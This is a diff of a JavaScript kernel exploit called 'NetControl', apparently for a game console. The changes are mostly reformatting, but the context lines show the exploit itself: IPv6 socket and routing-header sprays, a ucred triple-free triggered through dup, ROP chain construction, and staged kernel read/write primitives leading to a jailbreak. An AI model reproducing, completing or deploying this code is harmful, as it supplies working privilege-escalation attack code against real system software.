@@ -5,22 +5,46 @@ include('util.js')
 // ============================================================================
 // NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
 // ============================================================================
-utils.notify("NetControl ð\x9F\x92\xA9 ð\x9F\x92\xA9")
+utils.notify('NetControl ð\x9F\x92\xA9 ð\x9F\x92\xA9')
 
 // Extract required syscalls from syscalls.map
 var kapi = {
-  read_lo: 0, read_hi: 0, read_found: false,
-  write_lo: 0, write_hi: 0, write_found: false,
-  close_lo: 0, close_hi: 0, close_found: false,
-  setuid_lo: 0, setuid_hi: 0, setuid_found: false,
-  dup_lo: 0, dup_hi: 0, dup_found: false,
-  socket_lo: 0, socket_hi: 0, socket_found: false,
-  socketpair_lo: 0, socketpair_hi: 0, socketpair_found: false,
-  recvmsg_lo: 0, recvmsg_hi: 0, recvmsg_found: false,
-  setsockopt_lo: 0, setsockopt_hi: 0, setsockopt_found: false,
-  getsockopt_lo: 0, getsockopt_hi: 0, getsockopt_found: false,
-  netcontrol_lo: 0, netcontrol_hi: 0, netcontrol_found: false,
-  mprotect_lo: 0, mprotect_hi: 0, mprotect_found: false
+  read_lo: 0,
+  read_hi: 0,
+  read_found: false,
+  write_lo: 0,
+  write_hi: 0,
+  write_found: false,
+  close_lo: 0,
+  close_hi: 0,
+  close_found: false,
+  setuid_lo: 0,
+  setuid_hi: 0,
+  setuid_found: false,
+  dup_lo: 0,
+  dup_hi: 0,
+  dup_found: false,
+  socket_lo: 0,
+  socket_hi: 0,
+  socket_found: false,
+  socketpair_lo: 0,
+  socketpair_hi: 0,
+  socketpair_found: false,
+  recvmsg_lo: 0,
+  recvmsg_hi: 0,
+  recvmsg_found: false,
+  setsockopt_lo: 0,
+  setsockopt_hi: 0,
+  setsockopt_found: false,
+  getsockopt_lo: 0,
+  getsockopt_hi: 0,
+  getsockopt_found: false,
+  netcontrol_lo: 0,
+  netcontrol_hi: 0,
+  netcontrol_found: false,
+  mprotect_lo: 0,
+  mprotect_hi: 0,
+  mprotect_found: false
 }
 
 // Get syscall addresses from already-scanned syscalls.map
@@ -119,7 +143,6 @@ if (!kapi.socket_found || !kapi.socketpair_found || !kapi.setsockopt_found || !k
 
 log('=== NetControl ===')
 
-
 // Pre-allocate all buffers once (reuse throughout exploit)
 var store_addr = mem.malloc(0x100)
 var rthdr_buf = mem.malloc(UCRED_SIZE)
@@ -166,7 +189,6 @@ if (socket_count !== IPV6_SOCK_NUM) {
   throw new Error('Failed to create all sockets')
 }
 
-
 log('Initializing pktopts on all sockets...')
 
 // Build setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0) ROP chain template
@@ -199,14 +221,9 @@ if (init_count === 0) {
   throw new Error('Failed to initialize pktopts')
 }
 
-
-
 // ============================================================================
 // STAGE 2: Spray routing headers
 // ============================================================================
-
-
-
 
 // Build IPv6 routing header template
 // Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
@@ -243,15 +260,9 @@ for (var i = 0; i < IPV6_SOCK_NUM; i++) {
 
 log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')
 
-
-
-
 // ============================================================================
 // STAGE 3: Trigger ucred triple-free and find twins/triplet
 // ============================================================================
-
-
-
 
 // Get syscall wrappers
 var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
@@ -595,7 +606,6 @@ if (iov_ss0 !== -1 && iov_ss1 !== -1) {
   log('IOV spray complete (synchronous)')
 }
 
-
 // Double free ucred (only dup works - doesn't check f_hold)
 var dup_wrapper = new BigInt(kapi.dup_hi, kapi.dup_lo)
 var dup_insts = build_rop_chain(
@@ -693,13 +703,13 @@ mem.free(leak_rthdr_buf)
 mem.free(leak_len_buf)
 
 // ============================================================================
-// STAGE 4: Leak kqueue structure 
+// STAGE 4: Leak kqueue structure
 // ============================================================================
 
 // ============================================================================
-// STAGE 5: Kernel R/W primitives via pipe corruption 
+// STAGE 5: Kernel R/W primitives via pipe corruption
 // ============================================================================
 
 // ============================================================================
-// STAGE 6: Jailbreak 
+// STAGE 6: Jailbreak
 // ============================================================================
